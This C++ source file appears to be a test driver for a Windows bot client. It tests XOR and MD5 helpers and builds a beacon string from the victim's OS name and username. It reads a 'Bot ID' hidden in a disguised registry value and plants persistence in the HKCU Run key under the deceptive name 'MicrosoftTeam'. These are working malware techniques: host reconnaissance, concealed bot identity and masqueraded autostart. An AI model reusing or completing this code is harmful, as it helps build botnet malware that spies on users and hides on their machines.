#include <Windows.h>
#include <stdio.h>
#include "crypt.h"
#include "defines.h"
#include "os.h"
#include "user.h"
#include "regedit.h"
#include "string.h"

int main(){
	BYTE key[] = { 0x41, 0x42, 0x43, 0x44, 0x45 };
	BYTE src[] = { 0x41, 0x42, 0x43 };
	BYTE dst[8];
	Crypter::_XOR(key, sizeof(key), dst, src, sizeof(src));
	//Crypter::XOR(key, sizeof(key), dst, dst, sizeof(dst));
	for (int i = 0; i < sizeof(src); i++){
		printf("%02X ",dst[i]);
	}
	Crypter::_XOR(key, sizeof(key), dst, dst, sizeof(dst));
	for (int i = 0; i < sizeof(src); i++){
		printf("%02X ", dst[i]);
	}
	
	BYTE md5hash[33];
	char* md5source = "HAINH";
	Crypter::_MD5HASH(md5hash, 32, (BYTE*)md5source, strlen(md5source));
	printf("md5hashed %s\r\n", md5hash);
	char os[MAX_OS_NAME];
	char username[MAX_USER_NAME];
	OS::_getOS(os);
	User::_getUserName(username);

	char cpostData[1024];
	CWA(kernel32, ZeroMemory)(cpostData, sizeof(cpostData));
	sprintf_s(cpostData, sizeof(cpostData), "os=%s&username=%s&id=%s", os, username, "12345677889");
	printf("cpostData: %s\r\n", cpostData);
	BYTE cpostDataEncrypted[1024];
	DWORD dwCount = 0;
	//while (1)
	{
		BYTE* pcTempID = (BYTE*) malloc (10);
		dwCount++;
		//int 
		CWA(kernel32, ZeroMemory)(pcTempID, 10);
		DWORD dwResult = Registry::_readFromRegA(pcTempID, 10,
			HKEY_CURRENT_USER, "Control Panel\\Colors", "Fixed");
		if (dwResult == ERROR_SUCCESS){// bot id exist
			printf("Bot ID exist\r\n");
			// update bot id to bot
			//strcpy_s(coreData.cBotID, strlen((char*)pcTempID), (char*)pcTempID);
			printf("Bot id exist: %s\r\n", pcTempID);
		}
		else{
			printf("Bot ID not exist\r\n");
		}
		free(pcTempID);
		printf("dwCount: %d\r\n", dwCount);
	}
	char* data = "C:\\zxay\\jlkj";
	printf("wcslen(data)*sizeof(wchar_t)=%d\r\n", strlen(data));
	DWORD dwResult = Registry::_writeDataToRegA(data, strlen(data), HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "MicrosoftTeam");
	printf("GetLastError: %d\r\n", dwResult);
	while (1) {
		char *pcResult = StringConverter::wchar_ttochar(L"abc123456");
		printf("%s\r\n", pcResult);
		free(pcResult);
	}
	wprintf(L"%s\r\n", StringConverter::chartowchar_t(StringConverter::wchar_ttochar(L"acb123456")));
	return 0;
}